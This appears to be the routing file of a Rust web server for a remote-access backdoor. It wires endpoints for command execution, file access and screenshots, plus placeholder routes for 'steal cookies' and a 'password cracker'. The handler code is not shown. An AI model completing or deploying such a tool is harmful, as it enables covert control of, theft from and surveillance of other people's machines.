mod exec;
mod fsxp;
mod scrn;

use crate::ShellState;
use axum::{
    routing::{get, post},
    Extension, Router,
};
use std::sync::{Arc, Mutex};

pub fn all_routes(shellstate: Arc<Mutex<ShellState>>) -> Router {
    Router::new()
        .route("/", get("login with username and password"))
        .route("/set", get("update username & password"))
        .route("/pswd", post("password cracker"))
        .route("/exec", post(exec::exec_cmd))
        .route("/fsxp", post(fsxp::post_file))
        // routes for easier access
        .route("/cookie", post("steal cookies"))
        .route("/fetch", post("operating system details"))
        // routes for real time data
        .route("/scrn", post(scrn::screenshot))
        // extensions
        .layer(Extension(shellstate))
}
